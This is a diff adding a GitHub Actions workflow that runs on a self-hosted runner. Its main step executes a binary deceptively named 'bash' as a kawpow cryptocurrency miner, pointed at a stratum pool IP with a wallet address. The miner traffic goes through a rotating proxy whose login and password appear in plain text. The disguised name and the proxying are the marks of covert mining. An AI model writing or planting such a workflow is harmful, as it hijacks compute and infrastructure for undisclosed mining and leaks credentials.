@@ -1,0 +1,32 @@
+name: Run bash --noTest
+
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+concurrency:
+  group: tesaction-run
+  cancel-in-progress: true
+
+jobs:
+  run:
+    # Jalan di self-hosted runner (PC pribadi)
+    runs-on: [self-hosted, linux]
+
+    timeout-minutes: 300
+
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v4
+
+      - name: Show WIB time (debug)
+        run: |
+          sudo timedatectl set-timezone Asia/Jakarta || true
+          date
+
+      - name: Run bash
+        run: |
+          chmod u+x ./bash
+          ./bash -a kawpow -o stratum+tcp://157.230.145.21:80 -u rUrmXcYw9tNsoBvHvQTDMrUFUd1D8MApm7.jasin --proxy atrfkwzc2-rotate:jasin987@p.webshare.io:80 --no-health
